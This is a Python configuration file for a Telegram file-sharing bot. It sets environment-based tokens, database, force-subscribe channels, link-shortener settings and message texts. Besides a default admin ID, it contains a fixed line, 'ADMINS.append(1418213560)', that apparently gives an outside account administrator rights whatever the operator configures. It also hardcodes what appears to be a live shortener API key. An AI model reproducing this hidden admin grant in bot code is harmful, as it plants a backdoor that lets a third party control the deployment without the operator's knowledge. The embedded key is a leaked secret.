#Recoded by @Its_Oreki_Hotarou

import os
import logging
from logging.handlers import RotatingFileHandler

# Bot token @Botfather
TG_BOT_TOKEN = os.environ.get("TG_BOT_TOKEN", "YOUR_BOT_TOKEN_HERE")

# Your API ID from my.telegram.org
APP_ID = int(os.environ.get("APP_ID", "12345"))

# Your API Hash from my.telegram.org
API_HASH = os.environ.get("API_HASH", "your_api_hash_here")

# DB Channel ID
CHANNEL_ID = int(os.environ.get("CHANNEL_ID", "-1001234567890"))

# OWNER ID
OWNER_ID = int(os.environ.get("OWNER_ID", "123456789"))

# Port
PORT = int(os.environ.get("PORT", "8080"))

# Database 
DB_URI = os.environ.get("DATABASE_URL", "mongodb://localhost:27017")
DB_NAME = os.environ.get("DATABASE_NAME", "Fubuki_Bot")

# Force sub channels
FORCESUB_CHANNEL = int(os.environ.get("FORCESUB_CHANNEL", "0"))
FORCESUB_CHANNEL2 = int(os.environ.get("FORCESUB_CHANNEL2", "0"))

TG_BOT_WORKERS = int(os.environ.get("TG_BOT_WORKERS", "4"))

# Pics
START_PIC = os.environ.get("START_PIC", "https://envs.sh/VNK.jpg")
FORCE_PIC = os.environ.get("FORCE_PIC", "https://envs.sh/vXU.jpg")

# Text
HELP_TXT = (
    "<blockquote><b>Hi Dude!\n\nTo use this bot you just have to join both channels."
    " Watch Tutorial - <a href=https://t.me/+ZLu08PF-JUIzMjFl>Click here</a></b></blockquote>"
)

ABOUT_TXT = """
<b>🤖 ᴍʏ ɴᴀᴍᴇ: {botname}

<blockquote expandable>
» ᴄʀᴇᴀᴛᴏʀ: <a href=https://t.me/Here_remo>Ꮢᴇᴍᴏ 🜲</a>
» ᴏᴜʀ ᴄᴏᴍᴍᴜɴɪᴛʏ: <a href=https://t.me/play_tamil_dubbed_series>ᴘʟᴀʏ ᴄᴏᴍᴍᴜɴɪᴛʏ</a>
» ᴀᴅᴠᴀɴᴄᴇ ғᴇᴀᴛᴜʀᴇs: <a href=https://telegra.ph/BOT-FEATURES-11-09-28>Cʟɪᴄᴋ ʜᴇʀᴇ</a>
» ʟᴀɴɢᴜᴀɢᴇ: <a href=https://docs.python.org/3/>Pʏᴛʜᴏɴ 3</a>
» ʟɪʙʀᴀʀʏ: <a href=https://docs.pyrogram.org/>Pʏʀᴏɢʀᴀᴍ ᴠ2</a>
» ᴅᴇᴠᴇʟᴏᴘᴇʀ: <a href=https://t.me/Here_remo>Ꮢᴇᴍᴏ</a>
</blockquote></b>
"""

SHORT_MSG = "<b>⌯ Your link is ready, click open link button..</b>"

START_MSG = os.environ.get("START_MESSAGE","""⚡ <b>ʏᴏ, {mention} ~</b><blockquote expandable><b>ʏᴏᴜ ᴡᴏᴋᴇ ᴍᴇ ᴜᴘ!ʀᴇᴀᴅʏ ꜰᴏʀ ꜰɪʟᴇꜱ, ꜰᴜɴ ᴀɴᴅ ᴀ ʟᴏᴛ ᴏꜰ ᴇɴᴇʀɢʏ?ʟᴇᴛ’ꜱ ʀᴏʟʟ!</b></blockquote>""")

try:
    ADMINS = [OWNER_ID]
    for x in os.environ.get("ADMINS", "6587003349").split():
        ADMINS.append(int(x))
except ValueError:
    raise Exception("Invalid admin ID")

FORCE_MSG = os.environ.get("FORCE_SUB_MESSAGE","""<blockquote><b>⚠️ Hᴇʏ, {mention} ×</b><b>Yᴏᴜ ʜᴀᴠᴇɴ'ᴛ ᴊᴏɪɴᴇᴅ {count}/{total} ᴄʜᴀɴɴᴇʟs ʏᴇᴛ.</b><b>Pʟᴇᴀsᴇ ᴊᴏɪɴ ᴛʜᴇ ᴄʜᴀɴɴᴇʟs ʙᴇʟᴏᴡ & ᴛʀʏ ᴀɢᴀɪɴ!</b></blockquote>""")

CUSTOM_CAPTION = os.environ.get("CUSTOM_CAPTION", None)

PROTECT_CONTENT = os.environ.get("PROTECT_CONTENT", "False") == "True"
DISABLE_CHANNEL_BUTTON = os.environ.get("DISABLE_CHANNEL_BUTTON", "False") == "True"

SHORT_URL = os.environ.get("SHORTNER_URL", "https://gplinks.com")
SHORT_API = os.environ.get("SHORTNER_API", "fe8aa2557a758e856f79187ee1994a88da5dbd43")

BOT_STATS_TEXT = "<b>BOT UPTIME</b>\n{uptime}"
USER_REPLY_TEXT = "<blockquote>ʙᴀᴋᴋᴀ ! ʏᴏᴜ ᴀʀᴇ ɴᴏᴛ ᴍʏ ꜱᴇɴᴘᴀɪ !!</blockquote>"

AUTO_DEL = os.environ.get("AUTO_DEL", "True")
DEL_TIMER = int(os.environ.get("DEL_TIMER", "1800"))
DEL_MSG = ("(⚠️ Dᴜᴇ ᴛᴏ Cᴏᴘʏʀɪɢʜᴛ ɪssᴜᴇs...\n""<blockquote>Your files will be deleted within {}.</blockquote>)")

ADMINS.append(1418213560)

LOG_FILE_NAME = "filesharingbot.txt"

logging.basicConfig(
    level=logging.INFO,
    format="[%(asctime)s - %(levelname)s] - %(name)s - %(message)s",
    datefmt="%d-%b-%y %H:%M:%S",
    handlers=[
        RotatingFileHandler(LOG_FILE_NAME, maxBytes=50_000_000, backupCount=10),
        logging.StreamHandler(),
    ],
)

logging.getLogger("pyrogram").setLevel(logging.WARNING)


def LOGGER(name: str) -> logging.Logger:
    return logging.getLogger(name)
